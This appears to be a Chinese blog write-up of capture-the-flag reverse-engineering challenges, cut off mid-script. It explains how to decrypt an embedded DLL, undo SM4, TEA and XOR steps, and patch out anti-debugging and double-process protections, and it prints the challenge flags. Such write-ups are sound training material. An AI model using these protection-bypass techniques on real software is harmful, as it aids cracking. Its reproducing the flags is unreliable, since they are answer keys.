    <content type="html"><![CDATA[<a id="more"></a><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201185722500.png"></p><p>一道hook题，ida打开代码还是比较清晰的，首先判断长度然后在加密，但是我没有搞清楚这个hook的流程，听别的师傅说的在CRT的时候，从r3到r0时候hook的😥（听的不是很懂），但是我瞎找找到这两个函数</p><p><strong>资源解密</strong></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201190115121.png"></p><p><strong>资源加载</strong></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201190013052.png"></p><p>可以看出程序加载了一个叫<strong>CIPHER_DLL</strong>的资源,这个资源其实就是经过加密的DLL，我用<strong>ResourceHacker</strong>(一个可以查看程序资源的工具)来查看程序中的资源</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201190453201.png"></p><p>程序中确实有一个叫<strong>CIPHER_DLL</strong>的资源,且这个资源需要解密才能使用,图中**wow!**就是证明,把这个资源的二进制文件提出来,在解密回去,得到一个DLL</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">//解密资源</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ResourceDecrypt</span>():</span></span><br><span class="line">    filepath = <span class="string">&#x27;C:\\Users\\86180\\Desktop\\CIPHER_DLL101&#x27;</span></span><br><span class="line">    dllpath = <span class="string">&#x27;C:\\Users\\86180\\Desktop\\DLL.dll&#x27;</span></span><br><span class="line">    key = <span class="string">&#x27;wow!&#x27;</span></span><br><span class="line">    size = os.path.getsize(filepath) <span class="comment"># 获得文件大小</span></span><br><span class="line">    <span class="keyword">with</span> open(filepath, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> cipher_stream:</span><br><span class="line">        <span class="keyword">with</span> open(dllpath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> dll_stream:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">                data = struct.unpack(<span class="string">&#x27;B&#x27;</span>, cipher_stream.read(<span class="number">1</span>))[<span class="number">0</span>] ^ ord(key[i%<span class="number">4</span>])</span><br><span class="line">                dll_stream.write(struct.pack(<span class="string">&#x27;B&#x27;</span>, data))</span><br></pre></td></tr></table></figure><p>把DLL用ida打开,查看加密函数,字符串已经告诉我们是SM4加密,没有魔改.</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201190932018.png"></p><p><a href="https://github.com/yang3yen/pysm4">SM4Github代码链接</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida <span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> pysm4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从ida中提取加密后的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump_ida_data</span>():</span></span><br><span class="line">    addr = <span class="number">0x00BFA808</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        res.append(get_byte(addr + i))</span><br><span class="line">    print(bytes(res).hex())</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 利用GitHub上找的sm4脚本,写的解密函数</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>():</span></span><br><span class="line">    string = <span class="string">b&#x27;Ez_5M4_C1pH@r!!!&#x27;</span>.hex()</span><br><span class="line">    key = <span class="number">0x457a5f354d345f433170484072212121</span></span><br><span class="line">    cipher1 = <span class="number">0xea6358b78ce2a1e9c5298f53e8083259</span></span><br><span class="line">    cipher2 = <span class="number">0xaf1b67aed9dacfc472ffb1ec7673f306</span></span><br><span class="line">    plain1 = hex(pysm4.decrypt(cipher1, key))[<span class="number">2</span>:]</span><br><span class="line">    plain2 = hex(pysm4.decrypt(cipher2, key))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(plain1),<span class="number">2</span>):</span><br><span class="line">        print(chr(int(plain1[i:i+<span class="number">2</span>],<span class="number">16</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(plain1),<span class="number">2</span>):</span><br><span class="line">        print(chr(int(plain2[i:i+<span class="number">2</span>],<span class="number">16</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># flag&#123;42b061b4cb41cfa89ca78047bde1856e&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201191532668.png" alt="image-20210201191532668"></p><h3 id="child-protect"><a href="#child-protect" class="headerlink" title="child_protect"></a>child_protect</h3><p>参考看雪的一篇文章：<a href="https://bbs.pediy.com/thread-95082.htm">https://bbs.pediy.com/thread-95082.htm</a></p><p>这道题考的是双进程守护问题，上面的文章和这道题类似，但是难点在于调试。</p><p>ida打开后发现主函数无法正常反编译，而且看到了int3中断异常指令。由于是双进程守护，需要找到创建子进程的地方</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202220203991.png"></p><p>通过搜索CreateProcess函数，确定子进程由函数sub_413670创建</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202220516727.png"></p><p>继续跟踪，确定了两个函数调用子进程，分别是sub_413BE0和sub_413950</p><p>而函数sub_413950是一个关键函数，他对子进程做了修改。如果想让ida正确的反编译，我们需要nop掉所有的int3指令，且按照程序修改部分指令，这里我用010Editor进行修改。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202221029165.png"></p><p>首先找到所有的int3指令</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202221659699.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202221750385.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202221833555.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202222047820.png"></p><p>上图就是需要我们首先nop掉的地方，用010Editor修改后再次用ida打开可以发现主函数已经可以正常反编译，但是还不能够动态调试，</p><p>因为所有的过程都是在子进程中进行，但是我们现在已经修改了父进程的数据和子进程一样，所以可以跳过调用子进程的步骤，这需要修改一部分数据。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202222323468.png"></p><p>经过多次下断点调试后，定位到函数sub_413D10，修改过后就可以进行调试，但是还有一个坑。。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202223254218.png"></p><p>每次调试到这里的时候都会闪退，无论怎么调都没有用，最后我选择的办法是直接patch掉调用这个函数的指令，因为这步比较简单，且不影响后面的数据。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202223522827.png"></p><p>在可以动调后，就可以分析算法了，算法有两处，一处异或，一处tea加密，异或函数我将他pach，直接看tea处</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202222546684.png" alt="异或"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202222610483.png" alt="tea"></p><p>tea加密的key是在运行时生成的，但是如果不动态调试也可以直接复制整个函数跑一遍也可以，我喜欢动态调试（懒）</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202224017437.png"></p><p>生成了8个数据，但是只用到了前四个，后面只需要找到加密后的数据就ok了，这里我用idapython</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202224217028.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DumpCipher</span>():</span></span><br><span class="line">    addr = []</span><br><span class="line">    res = []</span><br><span class="line">    start = <span class="number">0x4122C8</span></span><br><span class="line">    end = <span class="number">0x4123AE</span></span><br><span class="line">    curr_addr = start</span><br><span class="line">    dword = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> curr_addr &lt;= end:</span><br><span class="line">        addr.append(curr_addr)</span><br><span class="line">        curr_addr = idc.next_head(curr_addr,end)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">4</span>==<span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">            print(dword)</span><br><span class="line">            res.append(int(dword, <span class="number">16</span>))</span><br><span class="line">            dword = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        data = idc.print_operand(addr[i], <span class="number">1</span>).replace(<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> len(data) == <span class="number">1</span>:</span><br><span class="line">            data = <span class="string">&#x27;0&#x27;</span> + data</span><br><span class="line">        <span class="keyword">elif</span> len(data) == <span class="number">3</span>:</span><br><span class="line">            data = data[<span class="number">1</span>:]</span><br><span class="line">        dword = dword + data</span><br><span class="line">    <span class="comment"># print(dword)</span></span><br><span class="line">    res.append(int(dword, <span class="number">16</span>))</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202224331594.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TEA_decrypt</span><span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> sum = <span class="number">0xC6EF3720</span>, delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">XOR</span><span class="params">(<span class="keyword">uint32_t</span> *arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> sum = <span class="number">0x73FF8CA6</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        arr[i] ^= sum;</span><br><span class="line">        sum -= <span class="number">0x50FFE544</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> key[<span class="number">4</span>] = &#123; <span class="number">0x82aba3fe</span>, <span class="number">0xac1ddca8</span>, <span class="number">0x87ec6b60</span>, <span class="number">0xa2394568</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c1[<span class="number">2</span>] = &#123; <span class="number">3991505723</span>, <span class="number">3531991019</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c2[<span class="number">2</span>] = &#123; <span class="number">1360416890</span>, <span class="number">2984008969</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c3[<span class="number">2</span>] = &#123; <span class="number">1169078549</span>, <span class="number">1301151568</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c4[<span class="number">2</span>] = &#123; <span class="number">3739270283</span>, <span class="number">2612854497</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> v = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    TEA_decrypt(c1, key);</span><br><span class="line">    TEA_decrypt(c2, key);</span><br><span class="line">    TEA_decrypt(c3, key);</span><br><span class="line">    TEA_decrypt(c4, key);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint32_t</span> arr[] = &#123; <span class="number">0x3e9affcb</span>, <span class="number">0x478dce18</span>, <span class="number">0xb891a541</span>, <span class="number">0xc191b885</span>, <span class="number">0x6b9a84ff</span>, <span class="number">0xad61703e</span>, <span class="number">0xeb5f6c7d</span>, <span class="number">0x62772dbb</span> &#125;;</span><br><span class="line">    XOR(arr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//打印的是flag的16进制表示形式，再用python转成字符串</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202224635428.png"></p><p><em>flag: Mesmerizing_And_Desirable_As_wjq</em></p><h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p>这题有意思</p><p>异常处理反调试，函数sub_AE10C0调用了SetUnhandledExceptionFilter函数，意思就是发生异常时调用注册的函数，看看注册的函数</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210204132938000.png"></p><p>注册的函数是一个虚拟机，但是这个虚拟机很特殊，里面的handl是加减运算和位运算，参数是各种寄存器</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210204133850534.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210204133647983.png"></p><p>回到函数sub_AE10C0发现了C7这个字节码触发非法指令异常，然后调用注册的函数相当于用那个虚拟机模拟了一些汇编指令，直接还原后静态看汇编就OK</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">           push    ebp</span><br><span class="line">.text:004018F1                 mov     ebp, esp</span><br><span class="line">.text:004018F3                 push    ebx</span><br><span class="line">.text:004018F4                 push    esi</span><br><span class="line">.text:004018F5                 push    edi</span><br><span class="line">.text:004018F6                 push    offset sub_401630</span><br><span class="line">.text:004018FB                 call    ds:SetUnhandledExceptionFilter</span><br><span class="line">.text:004018FB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401901                 db 0C7h                 ; and eax, 0</span><br><span class="line">.text:00401902                 db 0FFh</span><br><span class="line">.text:00401903                 db    4                 </span><br><span class="line">.text:00401904                 db    1</span><br><span class="line">.text:00401905                 db    0</span><br><span class="line">.text:00401906 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401906                 xor     ecx, ecx</span><br><span class="line">.text:00401908</span><br><span class="line">.text:00401908 loc_401908:                             ; CODE XREF: .text:00401922↓j</span><br><span class="line">.text:00401908                 cmp     ecx, 20h ; &#39; &#39;</span><br><span class="line">.text:0040190B                 jge     short loc_401924</span><br><span class="line">.text:0040190B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040190D                 db 0C7h                 ; add eax, 11h</span><br><span class="line">.text:0040190E                 db 0FFh                    </span><br><span class="line">.text:0040190F                 db    0</span><br><span class="line">.text:00401910                 db    1</span><br><span class="line">.text:00401911                 db  11h</span><br><span class="line">.text:00401912                 db 0C7h                 ; and eax,1Fh</span><br><span class="line">.text:00401913                 db 0FFh</span><br><span class="line">.text:00401914                 db    4</span><br><span class="line">.text:00401915                 db    1</span><br><span class="line">.text:00401916                 db  1Fh</span><br><span class="line">.text:00401917 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401917                 mov     dword ptr (byte_457A4C+24h)[ecx*4], eax</span><br><span class="line">.text:00401917 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040191E                 db 0C7h                  ; inc ecx</span><br><span class="line">.text:0040191F                 db 0FFh</span><br><span class="line">.text:00401920                 db    2</span><br><span class="line">.text:00401921                 db    3</span><br><span class="line">.text:00401922 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401922                 jmp     short loc_401908</span><br><span class="line">.text:00401924 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401924</span><br><span class="line">.text:00401924 loc_401924:                             ; CODE XREF: .text:0040190B↑j</span><br><span class="line">.text:00401924                 xor     ecx, ecx</span><br><span class="line">.text:00401926</span><br><span class="line">.text:00401926 loc_401926:                             ; CODE XREF: .text:00401956↓j</span><br><span class="line">.text:00401926                 cmp     ecx, 20h ; &#39; &#39;</span><br><span class="line">.text:00401929                 jge     short loc_401958</span><br><span class="line">.text:0040192B                 mov     ebx, dword ptr (byte_457A4C+24h)[ecx*4]</span><br><span class="line">.text:00401932                 mov     edx, dword ptr (byte_457A4C+28h)[ecx*4]</span><br><span class="line">.text:00401939                 mov     al, byte_457A4C[edx]</span><br><span class="line">.text:0040193F                 mov     byte_4579E0[ebx], al</span><br><span class="line">.text:00401945                 mov     al, byte_457A4C[ebx]</span><br><span class="line">.text:0040194B                 mov     byte_4579E0[edx], al</span><br><span class="line">.text:0040194B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401951                 db 0C7h</span><br><span class="line">.text:00401952                 db 0FFh                 ; add ecx, 2</span><br><span class="line">.text:00401953                 db    0</span><br><span class="line">.text:00401954                 db    3</span><br><span class="line">.text:00401955                 db    2</span><br><span class="line">.text:00401956 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401956                 jmp     short loc_401926</span><br><span class="line">.text:00401958 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401958</span><br><span class="line">.text:00401958 loc_401958:                             ; CODE XREF: .text:00401929↑j</span><br><span class="line">.text:00401958                 xor     ecx, ecx</span><br><span class="line">.text:0040195A</span><br><span class="line">.text:0040195A loc_40195A:                             ; CODE XREF: .text:00401992↓j</span><br><span class="line">.text:0040195A                 cmp     ecx, 20h ; &#39; &#39;</span><br><span class="line">.text:0040195D                 jge     short loc_401994</span><br><span class="line">.text:0040195F                 mov     bl, byte_4579E0[ecx]</span><br><span class="line">.text:0040195F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401965                 db 0C7h                 ; and ebx, 1Fh</span><br><span class="line">.text:00401966                 db 0FFh</span><br><span class="line">.text:00401967                 db    4</span><br><span class="line">.text:00401968                 db    2</span><br><span class="line">.text:00401969                 db  1Fh</span><br><span class="line">.text:0040196A                 db 0C7h                 ; shl bl, 3</span><br><span class="line">.text:0040196B                 db 0FFh</span><br><span class="line">.text:0040196C                 db    7</span><br><span class="line">.text:0040196D                 db    2</span><br><span class="line">.text:0040196E                 db    3</span><br><span class="line">.text:0040196F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040196F                 mov     esi, ecx</span><br><span class="line">.text:00401971                 inc     esi</span><br><span class="line">.text:00401972                 and     esi, 1Fh</span><br><span class="line">.text:00401975                 mov     dl, byte_4579E0[esi]</span><br><span class="line">.text:0040197B                 and     dl, 0E0h</span><br><span class="line">.text:0040197E                 and     edx, 0FFh</span><br><span class="line">.text:0040197E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401984                 db 0C7h                  ; shr dl, 5 </span><br><span class="line">.text:00401985                 db 0FFh</span><br><span class="line">.text:00401986                 db    8</span><br><span class="line">.text:00401987                 db    4</span><br><span class="line">.text:00401988                 db    5</span><br><span class="line">.text:00401989 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401989                 or      bl, dl</span><br><span class="line">.text:0040198B                 mov     byte_457A04[ecx], bl</span><br><span class="line">.text:00401991                 inc     ecx</span><br><span class="line">.text:00401992                 jmp     short loc_40195A</span><br><span class="line">.text:00401994 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401994</span><br><span class="line">.text:00401994 loc_401994:                             ; CODE XREF: .text:0040195D↑j</span><br><span class="line">.text:00401994                 mov     al, byte_457A04</span><br><span class="line">.text:00401999                 mov     byte_457A28, al</span><br><span class="line">.text:0040199E                 mov     ecx, 1</span><br><span class="line">.text:004019A3</span><br><span class="line">.text:004019A3 loc_4019A3:                             ; CODE XREF: .text:004019CE↓j</span><br><span class="line">.text:004019A3                 cmp     ecx, 20h ; &#39; &#39;</span><br><span class="line">.text:004019A6                 jge     short loc_4019D0</span><br><span class="line">.text:004019A8                 mov     bl, byte_457A04[ecx]</span><br><span class="line">.text:004019AE                 mov     esi, ecx</span><br><span class="line">.text:004019AE ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019B0                 db 0C7h                 ; inc ecx</span><br><span class="line">.text:004019B1                 db 0FFh                 </span><br><span class="line">.text:004019B2                 db    3 </span><br><span class="line">.text:004019B3                 db    5</span><br><span class="line">.text:004019B4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019B4                 xor     bl, byte_457A04[esi]</span><br><span class="line">.text:004019BA                 mov     esi, ecx</span><br><span class="line">.text:004019BA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019BC                 db 0C7h                 ; and esi, 3</span><br><span class="line">.text:004019BD                 db 0FFh                              </span><br><span class="line">.text:004019BE                 db    4 </span><br><span class="line">.text:004019BF                 db    5</span><br><span class="line">.text:004019C0                 db    3</span><br><span class="line">.text:004019C1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019C1                 xor     bl, byte ptr aBier[esi] ; &quot;Bier&quot;</span><br><span class="line">.text:004019C7                 mov     byte_457A28[ecx], bl</span><br><span class="line">.text:004019CD                 inc     ecx</span><br><span class="line">.text:004019CE                 jmp     short loc_4019A3</span><br></pre></td></tr></table></figure><p>加密过程不复杂，首先计算了一组0到31的无序数，然后按照无序数两个一组交换输入数据，接着进行位运算，总体向前移动了三位，最后进行了异或加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解异或加密的脚本</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>():</span></span><br><span class="line">    res = []</span><br><span class="line">    key = <span class="string">&#x27;Bier&#x27;</span></span><br><span class="line">    Cipher = <span class="string">&#x27;938b8f431268f7907a4b6e421301b42120738d68cb19fcf8b26bc4abc89b8d22&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(Cipher),<span class="number">2</span>):</span><br><span class="line">        res.append(int(Cipher[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span 